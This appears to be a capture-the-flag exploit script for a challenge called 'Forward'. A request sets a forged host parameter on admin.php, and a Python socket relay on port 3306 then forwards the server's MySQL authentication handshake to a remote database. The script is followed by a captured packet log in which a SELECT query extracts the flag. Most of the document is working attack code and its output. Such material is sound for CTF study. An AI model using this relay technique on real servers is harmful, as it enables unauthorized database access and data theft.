'''
Forward
--------
Run this script and then send this request to the webserver:
	POST /admin.php?key=NOKEY&host=X.X.X.X HTTP/1.1
	key=NOKEY
'''
import socket

RHOST = '202.112.28.121'
LHOST = '0.0.0.0'
PORT = 3306
data = ''

mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

mysock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
mysock.bind((LHOST, PORT))
mysock.listen(1)


conn, addr = mysock.accept()
data += 'Connected by ' + str(addr) + '\n'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, PORT))
while 1:
	outdata = sock.recv(4096)
	data += 'Sending: '+`outdata`+'\n'
	if outdata:
		conn.send(outdata)
	
	indata = conn.recv(4096)
	data += 'Received: '+`indata`+'\n'
	if not indata: break
	sock.send(indata)

conn.close()
sock.close()
mysock.close()

print data

'''
Connected by ('202.112.28.121', 48005)
Sending: '[\x00\x00\x00\n5.5.41-0ubuntu0.14.04.1\x00\x02q\x0b\x00^;KIiVS{\x00\xff\xf7\x08\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0067Rw!89T{.pm\x00mysql_native_password\x00'
Received: 'S\x00\x00\x01\x05\xa2\x0e\x00\x00\x00\x00@\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00forward\x00\x14Iu\x8b\xc3r\xea-\xa4\xac\x84\xa9\x8c\x0c}\x0c\x12\x05\x19\x1c\tmysql_native_password\x00'
Sending: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
Received: '\x03\x00\x00\x00\x1b\x01\x00'
Sending: '\x05\x00\x00\x01\xfe\x00\x00\x02\x00'
Received: '\x1e\x00\x00\x00\x03SELECT flag FROM forward.flag'
Sending: '\x01\x00\x00\x01\x01-\x00\x00\x02\x03def\x07forward\x04flag\x04flag\x04flag\x04flag\x0c\x08\x000\x00\x00\x00\xfd\x00\x00\x00\x00\x00\x05\x00\x00\x03\xfe\x00\x00"\x00\x14\x00\x00\x04\x130ctf{w3ll_d0ne_guY}\x05\x00\x00\x05\xfe\x00\x00"\x00'
Received: '\x01\x00\x00\x00\x01'
Sending: ''
Received: ''

Flag: 0ctf{w3ll_d0ne_guY}
'''

